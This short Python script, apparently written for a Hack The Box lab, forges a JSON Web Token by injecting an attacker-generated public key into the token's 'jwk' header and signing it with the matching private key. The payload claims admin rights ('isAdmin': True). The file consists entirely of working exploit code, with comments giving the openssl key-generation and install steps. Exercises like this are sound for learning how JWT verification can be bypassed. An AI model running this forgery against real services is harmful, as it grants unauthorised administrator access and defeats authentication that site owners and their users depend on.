from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from jose import jwk
import jwt

# Firstly, we need to generate our own keys to sign the JWT. We can do so with the following commands:
# $ openssl genpkey -algorithm RSA -out exploit_private.pem -pkeyopt rsa_keygen_bits:2048
# $ openssl rsa -pubout -in exploit_private.pem -out exploit_public.pem

# Install dependencies
# % pip3 install pyjwt cryptography python-jose


# JWT Payload
jwt_payload = {'user': 'htb-stdnt', 'isAdmin': True}


# convert PEM to JWK
with open('exploit_public.pem', 'rb') as f:
    public_key_pem = f.read()
public_key = serialization.load_pem_public_key(public_key_pem, backend=default_backend())
jwk_key = jwk.construct(public_key, algorithm='RS256')
jwk_dict = jwk_key.to_dict()


# forge JWT
with open('exploit_private.pem', 'rb') as f:
    private_key_pem = f.read()
token = jwt.encode(jwt_payload, private_key_pem, algorithm='RS256', headers={'jwk': jwk_dict})


print(token)